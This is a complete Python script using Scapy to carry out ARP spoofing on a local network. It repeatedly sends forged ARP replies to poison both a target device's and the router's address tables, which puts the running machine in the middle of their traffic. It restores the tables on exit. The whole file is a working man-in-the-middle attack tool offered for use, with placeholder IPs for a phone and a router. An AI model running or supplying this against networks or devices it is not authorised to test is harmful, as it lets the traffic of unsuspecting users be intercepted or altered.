from scapy.all import ARP, Ether, srp, send, conf
import time
import sys

conf.verbose = 1  # Enable verbose mode to see detailed output

def get_mac(ip):
    """ Get MAC address of the target IP """
    print(f"Getting MAC address for IP: {ip}")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)
    for _, rcv in ans:
        mac = rcv[Ether].src
        print(f"MAC address for {ip} is {mac}")
        return mac
    print(f"Failed to get MAC address for {ip}")
    return None

def spoof(target_ip, host_ip):
    """ Spoof the ARP table of the target IP """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC address for IP: {target_ip}")
        sys.exit(1)

    # Craft the ARP packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    print(f"Sending spoofed ARP response: {target_ip} is-at {host_ip} ({target_mac})")
    send(arp_response, verbose=0)

def restore(target_ip, host_ip):
    """ Restore the original ARP table entry """
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    print(f"Restoring ARP table: {target_ip} is-at {host_ip} ({host_mac})")
    send(arp_response, count=3, verbose=0)

if __name__ == "__main__":
    target_ip = "192.168.0.84"  # Replace with your phone's IP address
    gateway_ip = "192.168.0.1"  # Replace with your router's IP address

    try:
        print("Starting ARP spoofing... Press Ctrl+C to stop.")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("ARP tables restored. Exiting.")
